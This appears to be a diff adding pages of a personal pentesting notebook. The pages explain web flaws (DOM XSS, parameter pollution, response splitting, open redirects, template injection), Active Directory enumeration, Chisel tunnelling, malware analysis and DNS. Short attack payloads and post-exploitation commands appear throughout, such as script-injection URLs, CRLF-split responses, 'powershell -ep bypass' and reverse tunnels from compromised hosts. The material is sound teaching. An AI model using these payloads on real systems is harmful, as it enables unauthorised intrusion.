+<pre><code>http://127.0.0.1:8080/example.html#test=val
+</code></pre>
+<p>The fragment part (<code>#test=val</code>) is never sent to the server - it is only available locally.</p>
+<p>Suppose you had the following client-side Javascript code running:</p>
+<pre><code class="language-js">const pos = document.URL.indexOf(&quot;test=&quot;) + 5;
+const value = document.URL.substring(document.URL.indexOf(&quot;test=&quot;) + 5, document.URL.length);
+
+document.write(value);
+</code></pre>
+<p>An attacker could craft the following URL:</p>
+<pre><code>http://127.0.0.1:8080/example.html#test=&lt;script&gt;alert('xss')&lt;/script&gt;
+</code></pre>
+<p>However, if a victim clicks on this link, no Javascript should be injected, since the browser would usually automatically escape it - you would get</p>
+<pre><code>%3Cscript%3Ealert('xss')%3C/script%3E
+</code></pre>
+<p>printed on the page. If you, however, unescape the Javascript in your client-side code, it will get executed.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-6"><a class="header" href="#overview-6">Overview</a></h1>
+<p>HTTP Parameter Pollution describes the set of techniques used for manipulating how a server handles parameters in an HTTP request. This vulnerability may occur when duplicating or additional parameters are injected into an HTTP request and the website trusts them. Usually, HPP (HTTP Parameter Pollution) vulnerabilities depend on the way the server-side code handles parameters.</p>
+<h1 id="server-side-hpp"><a class="header" href="#server-side-hpp">Server-Side HPP</a></h1>
+<p>You send the server unexpected data, trying to make the server give an unexpected response. A simple example could be a bank transfer.</p>
+<p>Suppose, your bank performs transfers on its website through the use of HTTP parameters. These could be a <code>recipient=</code> parameter for the receiving party, an <code>amount=</code> parameter for the amount to send in a specific currency, and a <code>sender=</code> parameter for the one who sends the money.</p>
+<p>A URL for such a transfer could look like the following:</p>
+<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl
+</code></pre>
+<p>It may be possible that the bank server assumes it will only ever receive a single <code>sender=</code> parameter, however, submitting two such parameters (like in the following URL), may result in unexpected behaviour:</p>
+<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
+</code></pre>
+<p>An attacker could send such a request in hopes that the server will perform any validations with the first parameter and actually transfer the money from the second account specified. When different web servers see duplicate parameters, they handle them in <a href="Exploitation/Web/../../Web/Duplicate%20HTTP%20Parameter%20Handling.html">different ways</a>.</p>
+<p>Even if a parameter isn't sent through the URL, inserting additional parameters may still cause unexpected server behaviour. This is especially the case with server code which handles parameters in arrays or vectors through indices. Inserting additional parameters at different places in the URL may cause reordering of the array values and lead to unexpected behaviour.</p>
+<p>An example could be the following:</p>
+<pre><code>https://www.bank.com/transfer?amount=1000&amp;recipient=ghijkl
+</code></pre>
+<p>The server would deduce the sender on the server-side instead of retrieving it from an HTTP request.</p>
+<p>Normally, you wouldn't have access to the server code, but for a POC I have written a simple server in a pseudo-code (no particular language).</p>
+<pre><code class="language-javascript">sender.id = abcdef
+
+function init_transfer(params)
+{
+	params.push(sender.id) // the sender.id should be inserted at params[2]
+	prepare_transfer(params)
+}
+
+function prepare_transfer(params)
+{
+	amount = params[0]
+	recipient = params[1]
+	sender = params[2]
+	
+	transfer(amount, recipient, sender)
+}
+</code></pre>
+<p>Two functions are created here, <code>init_transfer</code> and <code>prepare_transfer</code> which takes a <code>params</code> vector. This function also later invokes a <code>transfer</code> function, the contents of which are currently out of scope. Following the above URL, the <code>amount</code> parameter be 1000, the recipient would be <code>ghijkl</code>. The <code>init_transfer</code> function adds the <code>sender.id</code> to the parameter array. Note, that the program expects the sender ID to be the 3rd (2nd index) parameter in the array in order to function properly. Finally, the transfer params array should look like this: <code>[1000, ghijkl, abcdef]</code>.</p>
+<p>Now, an attacker could make a request to the following URL:</p>
+<pre><code>https://www.bank.com/transfer?amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
+</code></pre>
+<p>In this case, <code>sender=</code> would be included into the parameter vector in its initial state (before the <code>init_transfer</code> function is invoked). This means that the <code>params</code> array would look like this: <code>[1000, ghijkl, ABCDEF]</code>. When <code>init_transfer</code> is called, the <code>sender.id</code> variable would be appended to the vector and so it would look like this: <code>[1000, ghijkl, ABCDEF, abcdef]</code>. Unfortunately, the server still expects that the correct sender would be located at <code>params[2]</code>, but that is no longer the case since we managed to insert another sender. As such, the money would be withdrawn from <code>ABCDEF</code> and not <code>abcdef</code>.</p>
+<h1 id="client-side-hpp"><a class="header" href="#client-side-hpp">Client-Side HPP</a></h1>
+<p>These vulnerabilities allow the attacker to inject extra parameters in order to alter the client-side. An example of this is included in the following presentation: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf.</p>
+<p>The example URL is</p>
+<pre><code>http://host/page.php?par=123%26action=edit
+</code></pre>
+<p>The example server code is the following:</p>
+<pre><code class="language-php">&lt;? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?&gt;  
+&lt;a href=&quot;/page.php?action=view&amp;par='.&lt;?=$val?&gt;.'&quot;&gt;View Me!&lt;/a&gt;
+</code></pre>
+<p>Here, a new URL is generated based on the value of a parameter <code>$val</code>. Here, the attacker passes the value <code>123%26action=edit</code> onto the parameter. The URL-encoded value for <code>&amp;</code> is <code>%26</code>. When this gets to the <code>htmlspecialchars</code> function, the <code>%26</code> gets converted to an <code>&amp;amp;</code>. When the URL gets formed, it becomes</p>
+<pre><code class="language-html">&lt;a href=&quot;/page.php?  
+action=view&amp;par=123&amp;amp;action=edit&quot;&gt;
+</code></pre>
+<p>And since this is view as HTML, an additional parameter has been smuggled! The link would be equivalent to </p>
+<pre><code>/page.php?  
+action=view&amp;par=123&amp;action=edit
+</code></pre>
+<p>This second action parameter could cause unexpected behaviour based on how the server handles duplicate requests.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-5"><a class="header" href="#introduction-5">Introduction</a></h1>
+<p>HTTP Response Splitting occurs when user-provided input isn't sanitised and CRLFs are injected into HTTP responses. This is usually done through URL parameters. This type of attack typically requires social engineering or at least some user interaction.</p>
+<p>HTTP responses consist of message headers and a message body. The headers are separated from the body with 2 CRLFs - <code>\r\n\r\n</code>. An attacker could inject this character sequence into a header and terminate the header section - this could result in XSS, since anything after the 2 CRLFs will be treated as HTML.</p>
+<p>Imagine a custom header <code>X-Name: Bob</code> which is set via a parameter in a <code>GET</code> request called <code>name</code>. If input isn't properly sanitised, an attacker could craft the following URL which would result in XSS:</p>
+<pre><code class="language-html">?name=Bob%0d%0a%0d%0a&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre>
+<p>In other cases, HTTP response splitting may be used to send two responses to a single request by injecting the second response into the first one. A URL like the following could change the contents of a legitimate page that the target visits:</p>
+<pre><code class="language-html">application.com/redir.php?lang=hax%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%d%aContent-Length:%2019%0d%0a&lt;html&gt;Hacked&lt;/html&gt;
+</code></pre>
+<p>All the target needs to do, is visit the URL.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-7"><a class="header" href="#overview-7">Overview</a></h1>
+<p>Open redirect vulnerabilities occur when a target visits a website which sends their browser to another URL. These attacks only redirect users and as such are often considered to be of low severity. </p>
+<h1 id="how-do-they-work"><a class="header" href="#how-do-they-work">How Do They Work</a></h1>
+<p>Open redirects occur when a developer mistrusts user input, which redirects to another site, usually via a URL<br />
+parameter, HTML <code>&lt;meta&gt;</code> tags, or the DOM window<br />
+location property.</p>
+<h2 id="url-parameter-redirect"><a class="header" href="#url-parameter-redirect">URL Parameter Redirect</a></h2>
+<p>Suppose that Google could redirect users to their Gmail service via the following URL:</p>
+<pre><code>https://www.google.com/?redirect_to=https://www.gmail.com
+</code></pre>
+<p>In this case, visiting <code>www.google.com</code> would result in your browser sending an HTTP request to the Google web server. The server would process this request and return a status code - typically 302, although it may sometimes be 301, 303, 307, or 308. This code would inform the browser that the page has been found, however, it would also tell it to make an additional HTTP request to <code>www.gmail.com</code>. This will be noted in the <code>Location:</code> header of the HTTP response. This header specifies where to redirect <code>GET</code> requests. An attacker could change the value of the <code>redirect_to</code> parameter and forward you to their malicious server.</p>
+<p>Common redirection parameter names include <code>url=</code>, <code>redirect=</code>, <code>next=</code>, however, they may also be denoted by a single letter at times.</p>
+<h2 id="meta-refresh-tag-redirect"><a class="header" href="#meta-refresh-tag-redirect">Meta Refresh Tag Redirect</a></h2>
+<p>HTML <code>&lt;meta&gt;</code> tags can tell a browser to reload a page and make a <code>GET</code> request to a specified URL. This URL is defined in the tag's <code>content</code> attribute.</p>
+<p>This is an example of such a tag:
+<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=https://www.google.com/&quot;&gt;</code></p>
+<p>First, the <code>content</code> attribute defines the number of seconds the browser should wait before making the request to the URL. Secondly, it specifies the URL to make the request to.</p>
+<h2 id="javascript-redirect"><a class="header" href="#javascript-redirect">Javascript Redirect</a></h2>
+<p>Open redirects can be exploited by modifying the window's <code>location</code> property through the Document Object Model. This property denotes where a request should be redirected to.</p>
+<p>An attacker may change the <code>location</code> property through any of the following ways:</p>
+<pre><code class="language-javascript">window.location = https://www.google.com/  
+window.location.href = https://www.google.com  
+window.location.replace(https://www.google.com)
+</code></pre>
+<p>This type of open redirect is usually chained with some sort of XSS.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-8"><a class="header" href="#overview-8">Overview</a></h1>
+<p>Template Injection occurs when an attacker injects malicious template code into an input field and the templating engine doesn't sanitise the input. As such, the expression provided by the attacker may be evaluated and can lead to all sorts of nasty vulnerabilities such as RCE.</p>
+<h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server-Side Template Injection</a></h1>
+<p>SSTI occurs when the injection happens on the server-side. Templating engines are associated with different programming languages, so you might be able to execute code in that language when SSTI occurs.</p>
+<p>Testing for SSTI is template engine-dependent because different engines make use of a different syntax. It is, however, common to see templates enclosed in two pairs of <code>{{}}</code>. </p>
+<p>You should look for places in a webpage where user input is reflected. If you inject <code>{{7*'7'}}</code> and see <code>49</code> or <code>7777777</code> somewhere, then you know you have SSTI. This syntax isn't standard. You will need to identify the running template engine and use the correct syntax.</p>
+<h1 id="client-side-template-injection"><a class="header" href="#client-side-template-injection">Client-Side Template Injection</a></h1>
+<p>This vulnerability occurs in client template engines, which are written in Javascript. Such engines are Google's AngularJS and Facebook's ReactJS.</p>
+<p>CSTI typically occur in browser, so they typically cannot be used for RCE, but may be exploited for XSS. This can be difficult, since most engines do a good job at sanitising input and preventing XSS.</p>
+<p>When interacting with ReactJS, you should look for <code>dangerouslySetInnerHTML</code> function calls where you can modify the input. This function intentionally bypasses React's XSS protections.</p>
+<p>AngularJS versions before 1.6 include a sandbox in order to limit the available Javascript functions, but bypasses have been found. You can check the AngularJS version by typing <code>Angular.version</code> in the developer console. A list of bypasses can be found at https://pastebin.com/xMXwsm0N, however, more are surely available online.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="post-exploitation"><a class="header" href="#post-exploitation">Post Exploitation</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-ad"><a class="header" href="#active-directory-ad">Active Directory (AD)</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-9"><a class="header" href="#overview-9">Overview</a></h1>
+<p>Bloodhound is a tool used for finding relationships and patterns within data from an Active Directory environment. It is run on the attacker's machine and accessed through a web interface. Bloodhound operates on data and this data comes from a <em>collector</em> which is executed on the target machine.</p>
+<h1 id="setup-1"><a class="header" href="#setup-1">Setup</a></h1>
+<ol>
+<li>Install Bloodhound</li>
+</ol>
+<pre><code class="language-bash">sudo apt install bloodhound
+</code></pre>
+<ol start="2">
+<li>Configure neo4j - Bloodhound relies on a different tool called neo4j. It is best to change its default credentials.
+<ul>
+<li>run neo4j</li>
+</ul>
+<pre><code class="language-bash">sudo neo4j console
+</code></pre>
+<ul>
+<li>open the link it gives you and use the credentials neo4j:neo4j to login</li>
+<li>change the password</li>
+</ul>
+</li>
+</ol>
+<h1 id="collecting-data-for-bloodhound"><a class="header" href="#collecting-data-for-bloodhound">Collecting Data for Bloodhound</a></h1>
+<p>Data is obtain through a collector. There are different ones available. You can get SharpHound from the Bloodhound GitHub repo - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1.</p>
+<p>Start neo4j and bloodhound:</p>
+<pre><code class="language-bash">sudo neo4j console
+</code></pre>
+<pre><code class="language-bash">sudo bloodhound
+</code></pre>
+<p>Run the collector on the target machine:</p>
+<pre><code class="language-powershell">powershell -ep bypass
+</code></pre>
+<pre><code class="language-powershell">. .\SharpHound.ps1
+</code></pre>
+<pre><code class="language-powershell">Invoke-BloodHound -CollectionMethod All -Domain &lt;domain&gt; -ZipFileName &lt;output file&gt;
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/sharphoundcollector.png" alt="" /></p>
+<p>Now, move the files to the attacker machine.</p>
+<h1 id="viewing-the-data"><a class="header" href="#viewing-the-data">Viewing the Data</a></h1>
+<p>In Bloodhound, on the right you should see a button for <code>Upload Data</code>. Select the previously obtained zip file and wait for Bloodhound to process it.</p>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/uploaddata.png" alt="" /></p>
+<p>In the top left, click on the three dashes and you should see a summary of the data imported:</p>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/importedsummary.png" alt="" /></p>
+<h1 id="finding-relationships-in-the-data"><a class="header" href="#finding-relationships-in-the-data">Finding Relationships in the Data</a></h1>
+<p>Through the analysis tab, you can see a bunch of pre-made queries. Their names are usually self-describing. Clicking on any of them will generate a particular graph expressing a specific relationship within the AD environment:</p>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/domainadmins.png" alt="" /></p>
+<p>You are also able to create custom queries.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-10"><a class="header" href="#overview-10">Overview</a></h1>
+<p>PowerView is a PowerShell tool for the enumeration of Windows domains. The script can be downloaded from https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1.</p>
+<p>Before running, you need to bypass PowerShell's execution policy:</p>
+<pre><code class="language-powershell">powershell -ep bypass
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/powershell-ep-bypass.png" alt="" /></p>
+<p>Load the script using</p>
+<pre><code class="language-powershell">. .\PowerView.ps1
+</code></pre>
+<p>Normally, you'd be running these commands through some sort of shell, but for the sake of simplicity, I will show them all run locally.</p>
+<h1 id="get-domain-information"><a class="header" href="#get-domain-information">Get Domain Information</a></h1>
+<pre><code class="language-powershell">Get-NetDomain
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetdomain.png" alt="" /></p>
+<h1 id="get-domain-controller-information"><a class="header" href="#get-domain-controller-information">Get Domain Controller Information</a></h1>
+<pre><code class="language-powershell">Get-NetDomainController
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetdomaincontroller.png" alt="" /></p>
+<h1 id="retrieve-domain-policy-information"><a class="header" href="#retrieve-domain-policy-information">Retrieve Domain Policy Information</a></h1>
+<pre><code class="language-powershell">Get-DomainPolicy
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomainpolicy.png" alt="" /></p>
+<p>You can also get information about a specific policy with the following syntax:</p>
+<pre><code class="language-powershell">(Get-DomainPolicy).&quot;policy name&quot;
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getsystemaccessdomainpolicy.png" alt="" /></p>
+<h1 id="get-users-information"><a class="header" href="#get-users-information">Get Users Information</a></h1>
+<pre><code class="language-powershell">Get-NetUser
+</code></pre>
+<p>The output of this command is rather messy, but you can pull specific information with the following syntax:</p>
+<pre><code class="language-powershell">Get-NetUser | select &lt;property&gt;
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetusersamaccname.png" alt="" /></p>
+<p>However, there is an even better way to do that.</p>
+<h1 id="get-user-property-information"><a class="header" href="#get-user-property-information">Get User Property Information</a></h1>
+<p>Get a specific properties of all the users:</p>
+<pre><code class="language-powershell">Get-DomainUser -Properties &lt;property1&gt;,&lt;property2&gt;,...
+</code></pre>
+<p>It is useful to always have the <code>samaccountname</code> as the first property selected, so that you can easily match properties with specific users.</p>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomainuserproperty.png" alt="" /></p>
+<h1 id="get-domain-machines"><a class="header" href="#get-domain-machines">Get Domain Machines</a></h1>
+<pre><code class="language-powershell">Get-DomainComputer | select samaccountname, operatingsystem
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomaincomputers.png" alt="" /></p>
+<h1 id="get-groups"><a class="header" href="#get-groups">Get Groups</a></h1>
+<pre><code class="language-powershell">Get-NetGroup | select samaccountname, admincount, description
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomaingroups.png" alt="" /></p>
+<h1 id="get-group-policy-information"><a class="header" href="#get-group-policy-information">Get Group Policy Information</a></h1>
+<pre><code class="language-powershell">Get-NetGPO | select &lt;property1&gt;,&lt;property2&gt;,...
+</code></pre>
+<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetgpo.png" alt="" /></p>
+<h1 id="additional-resources"><a class="header" href="#additional-resources">Additional Resources</a></h1>
+<p>https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-6"><a class="header" href="#introduction-6">Introduction</a></h1>
+<p>Chisel is an open-source application for port tunneling. You can get it from https://github.com/jpillora/chisel. Clone the repo and follow the installation instructions.</p>
+<p>In order to port tunnel with chisel, you need to have a copy of the binary on both the attacking and the compromised machines.</p>
+<h1 id="creating-a-reverse-tunnel"><a class="header" href="#creating-a-reverse-tunnel">Creating a reverse tunnel</a></h1>
+<p>Run the following command on the attacking machine:</p>
+<pre><code class="language-bash">chisel server -p [Listen Port] --reverse &amp;
+</code></pre>
+<p>This will setup a chisel server on <code>Listen Port</code>.</p>
+<p>On the compromised systenm run:</p>
+<pre><code class="language-bash">chisel client [Attacker IP]:[Listen Port] R:[Local Host]:[Local Port]:[Remote Host]:[Remote Port] &amp;
+</code></pre>
+<p>This will endeavour to connect to a chisel server at the specified <code>Attacker IP</code> and <code>Listen Port</code>. Once it has connected to the remote chisel server, the chisel server will open <code>Remote Port</code> on the <code>Remote Host</code> and tunnel it to the <code>Local Port</code> of <code>Local Host</code>. From now on, any traffic sent to <code>Remote Port</code> on the <code>Remote Host</code> will be forwarded to the <code>Local Port</code> of <code>Local Host</code>. </p>
+<p>Chisel also defines some defaults for these values, which means you can omit some of them:</p>
+<p><code>Local Host</code> - 0.0.0.0
+<code>Remote Host</code> - 0.0.0.0 (server localhost)</p>
+<p>As an example, suppose you start a chisel server on your attacking machine (10.10.10.189) on port 1337, and want to gain access to port 3306 on the compromised machine. On the attacking machine you run:</p>
+<pre><code class="language-bash">chisel server -p 1337 --reverse &amp;
+</code></pre>
+<p>On the compromised system you will run:</p>
+<pre><code class="language-bash">chisel client 10.10.10.189:1337 R:localhost:3306:localhost:31337 &amp;
+</code></pre>
+<p>The above basically translates to &quot;Forward any traffic intended for port 31337 localhost on my attacking machine to port 3306 on the localhost of the compromised system&quot;.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="1-goals-of-malware-analysis"><a class="header" href="#1-goals-of-malware-analysis">1. Goals of Malware Analysis</a></h1>
+<p>Malware analysis serves the purpose of providing the information needed to respond to a network intrusion. You will typically need to determine what took place and make sure that you have identified all of the infected machines and files. In analyzing suspected malware, you will seek to determine exactly what it does, how it can be detected on a network, and how to measure and contain its damage.</p>
+<ul>
+<li><em>host-based signatures</em> - also known as indicators, are used to detect malicious code on victim computers. These often identify files created and/or modified by the malware or specific changes it makes to the registry. Unlike antivirus signatures, malware indicators focus on what the malware does to a system and not on what its characteristics are. Hence why they are better at detected malware which mutates or has been erased from the hard disk.</li>
+<li><em>network singnatures</em> - they detect malware by analyzing network traffic.</li>
+</ul>
+<h1 id="2-malware-analysis-techniques"><a class="header" href="#2-malware-analysis-techniques">2. Malware Analysis Techniques</a></h1>
+<ul>
+<li>Basic Static Analysis - examining the executable without looking at the actual instructions. It can provide confirmation of whether a file is malicious, information about its functionality, and information for producing network signatures. It is straightforward and often quick, but rather ineffective against sophisticated malware.</li>
+<li>Basic Dynamic Analysis - running the malware and examining its behaviour in order to remove it from the system, produce effective signatures, or both. It requires an environment to run the malware without affecting your host system or network.</li>
+<li>Advanced Static Analysis - reverse-engineering the malware by loading the executable into a disassembler and examining the program instructions in order to piece together what the program does.</li>
+<li>Advanced Dyanamic Analysis - using a debugger to look at the internal state of the malicious code at runtime. </li>
+</ul>
+<h1 id="3-types-of-malware"><a class="header" href="#3-types-of-malware">3. Types of malware</a></h1>
+<ul>
+<li>to be finished</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="1-antivirus-scanning"><a class="header" href="#1-antivirus-scanning">1. Antivirus Scanning</a></h1>
+<p>A good first step when analyzing possible malware is to scan it with multiple antivirus programs, which may already have identified the malicious code. However, AV tools are not perfect. The are reliant on a database which contains <em>file signatures</em> - identifiable pieces of known malicious code, and on <em>heuristics</em> - the analysis of behaviour combined with pattern-matching. Rare and modified malware can easily evade AV detection simply because it is not contained its database.</p>
+<p>One should run several different antivirus programs against the prospective malicious code, since different AVs use different signatures and heuristics. As such, websites like <a href="https://www.virustotal.com/">VirusTotal</a> can prove very useful in these situations - they allow you to upload files to be scanned by multiple antivirus engines.</p>
+<h1 id="2-hashing"><a class="header" href="#2-hashing">2. Hashing</a></h1>
+<p>Hashing is a method commonly used for uniquely identifying malware. It can serve as a sort of <em>fingerprint</em> for the malicious code. The Message-Digest Algorithm 5 (MD5) is often used for this purpose, however, the Secure Hash Algorithm 1 (SHA-1) is also popular.</p>
+<p>On Windows, one can generate such a hash by using <code>CertUtil</code>:</p>
+<p><img src="Malware%20Analysis/Resources/Images/CertUtil-md5sum.png" alt="" /></p>
+<p>On Linux, the <code>md5sum</code> command is usually available:</p>
+<p><img src="Malware%20Analysis/Resources/Images/Linux-md5sum.png" alt="" /></p>
+<p>Once you have a unique hash for some malware, you can use it in the following ways:</p>
+<ul>
+<li>using the hash as a label</li>
+<li>sharing the hash with other analysts to help them identify the malware</li>
+<li>look up the hash online to see if it has been previously identified</li>
+</ul>
+<p><em>It is recommended to use <code>sha256sum</code> when you identify malware because md5sum is vulnerable to collision attacks.</em></p>
+<h1 id="3-finding-strings"><a class="header" href="#3-finding-strings">3. Finding Strings</a></h1>
+<p>A <em>string</em> is a sequence of characters. A program may contain many different strings - printing a message, connecting to URLs, accessing file locations, etc. Searching through the strings in a program can give hints about its functionality.  If a program creates or modifies a specific file, you will be able to see the string of the file location in the program. The <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings">Strings</a> command can be used to seach a binary for strings that are usually stored in ASCII or Unicode format:</p>
+<p><img src="Malware%20Analysis/Resources/Images/Strings.png" alt="" /></p>
+<p><em>Note: I haven't used actual malicious code, but instead a little program that I created.</em> </p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-1"><a class="header" href="#dns-1">DNS</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-7"><a class="header" href="#introduction-7">Introduction</a></h1>
+<p>Computers connected to the Internet have a numerical identifier - called an Internet Protocol Address (IP Address) - which is used to communicate with this machine. However, remembering a 32-bit number for each computer you want to connect to - even if it's formatted nicely into four separate sections - isn't practical at all. As such, a systematic way of resolving this issue was a created - a sort of lookup table for IP addresses, known as the Domain Name System.</p>
+<h1 id="what-is-the-dns"><a class="header" href="#what-is-the-dns">What is the DNS?</a></h1>
+<p>The Domain Name System (or DNS for short) is a decentrialised database which provides answers to queries for <em>domain names</em>. Such a query is for example &quot;What is the IP address of google.com? &quot; When such a request is sent out, it will go through the DNS and eventually return with an IP address (if such was found). This saves the average user from having to remember a myriad different IPs for each website they want to visit.</p>
+<h1 id="the-dns-hierarchy"><a class="header" href="#the-dns-hierarchy">The DNS Hierarchy</a></h1>
+<p>The DNS utilises a hierarchical structure for both storing and serving requested information.</p>
+<p><img src="Networking/DNS/../Resources/Images/DNSHierarchy.png" alt="" /></p>
+<p>At the top of the hierarchy are positioned the root name servers. These store and serve information about the top-level domains (TLDs) such as <code>.net</code>, <code>.com</code>, and <code>.org</code>. The TLD servers provide information about domains which use their corresponding TLD - <code>.com</code> servers contain information about domains such as <code>google.com</code> or <code>duckduckgo.com</code>. They won't give you the IP addresses for these hosts, but will instead point you in the right direction - to another DNS server. </p>
+<p>The DNS can be thought of as a file system - one where the addresses are read from right to left and instead of forwards slashes, dots are used. The root is represented by a single dot (.), which is usually not visible. Next follow the top-level domains - similar to directories. Going further, we get second level domains and then subdomains, followed by hosts.</p>
+<h1 id="dissecting-a-basic-dns-query"><a class="header" href="#dissecting-a-basic-dns-query">Dissecting a Basic DNS Query</a></h1>
+<p>Typing a domain name - such as <code>google.com</code> - into your browser will cause your operating system to attempt to resolve that domain name, or in other words - determine its IP address. It will first check locally for an answer as this is the fastest option. It will look into the local cache and the <code>/etc/hosts</code> file (on UNIX-like system, or <code>C:\Windows\System32\drivers\etc\hosts</code> on Windows). If an answer is not found, the DNS request will be forwarded to your DNS server, which will usually be your home router. Your DNS server may have the answer cached because someone on your network recently queried the same domain. If not, the DNS server will contain an IP address for another name server where you can forward your request - for example the DNS server at your ISP. It's very unlikely that your ISP's name server won't have a cached answer, given the amount of queries that constantly go through it. However, if this happens to be the case, the ISP's name server will carry out further requests on your behalf - exactly how your router forwards the query to your ISP's name server. Name servers can be configured to perform such lookups recursively or not. </p>
+<p>If your ISP's name server does not know the IP for the server responsible for <code>.com</code> domains, it will ask one of the 13 root name servers, which are designated with the letters A through M). In reality, there are more than 13 physical machines handling these requests. More information about the root name servers you can find <a href="https://www.iana.org/domains/root/servers">here</a>.</p>
+<p>This process will continue until you are forwarded to the name server responsible for the domain you are looking for. This name server will provide you with the IP address of your desired domain, which will be cached, allowing quicker access later.</p>
+<h1 id="zones-and-authority"><a class="header" href="#zones-and-authority">Zones and Authority</a></h1>
+<p>Some name servers are authoritative in a particular subsection of the DNS - they answer queries only for domains in a particular space. Only one name server, known as the <em>Start of Authority (SOA)</em> could give a decisive answer for a particular query. Other name servers may have the answer cached, but only if they have previously requested it in the span of the time-to-live (TTL).</p>
+<p>For example, the SOA for <code>google.com</code> is only responsible for domains in the <code>google.com</code> space. The spaces or <em>name spaces</em> within the DNS are usually referred to as <em>zones of authority</em> or simply <em>zones</em>.
+In reality, there is usually more than a single name server for a big company like Google, however, they both do the same job and are considered the SOA. Their names usually go ns1, ns2, and so forth. Should one name server go offline, the next one would take its place in processing queries.</p>
+<h1 id="dns-resource-records"><a class="header" href="#dns-resource-records">DNS Resource Records</a></h1>
+<p>I already mentioned that the DNS is similar to a database - one split up and stored around the globe. The entries in this database are called <em>resource records</em> and are usually stored in a flat-file format. Resource records do not only store IP addresses and hostnames - they contain other useful information, as well. These are the most common different types of resource records (a complete list can be found <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types">here</a>):</p>
+<ul>
+<li><strong>Address of Host (A)</strong> - the IPv4 address of the host</li>
+<li><strong>Address of Host (AAAA)</strong> - the IPv6 address of the host</li>
+<li><strong>Canonical Name (CNAME)</strong> - also an alias; two domains might point to the same place, in which case, one would be an alias. Querying the domain in this server will result in the A record.</li>
+<li><strong>Mail Exchanger (MX)</strong> - refers to a mail server and can contain either an IP address or a hostname</li>
+<li><strong>Name Server (NS)</strong> - contains the name server information for a given zone</li>
+<li><strong>Start of Authority (SOA)</strong> - found at the beginning of every zone file, this record is bigger than others and stores the primary name server for the zone, including some other information</li>
+<li><strong>Pointer (PTR)</strong> - used for reverse DNS lookups - finding the hostname by providing an IP address</li>
+<li><strong>Text (TXT)</strong> - a simple text record used for adding extra functionality to DNS and storing miscellaneous information. Sometimes used by administrators for leaving humand-readable notes.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><p>This is a special domain used for reverse DNS lookups. In the <code>in-addr.arpa</code> domain, IP addresses are represented as a sequence of four decimal numbers separated by dots. The suffix of <code>in-addr.arpa</code> is appended to the IP address. In this domain, however, IP address octets are read from right to left, but the contents of the octets are not. For example, in order to do a reverse lookup on <code>172.217.169.174</code>, you would use <code>174.169.217.172.in-addr.arpa</code>. This domain is used for reverse lookups on IPv4 addresses. </p>
+<p>For IPv6 addresses, the <code>ip6.arpa</code> domain is used. The address is represented by hex digits in reverse order - each digit looking like a domain name. For example, to do a reverse look up on <code>2001:db8::567:89ab</code>, you would use <code>b.a.9.8.7.6.5.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8.b.d.0.1.0.0.2.ip6.arpa</code>.</p>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="network-address-translation"><a class="header" href="#network-address-translation">Network Address Translation</a></h1>
+<p><img src="https://66.media.tumblr.com/02a533c1d55ca0ba83e0176168df06ec/tumblr_inline_o4m1taQugo1u4ytoo_1280.jpg" alt="Private Ip Addresses Photos on the Web" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h1>
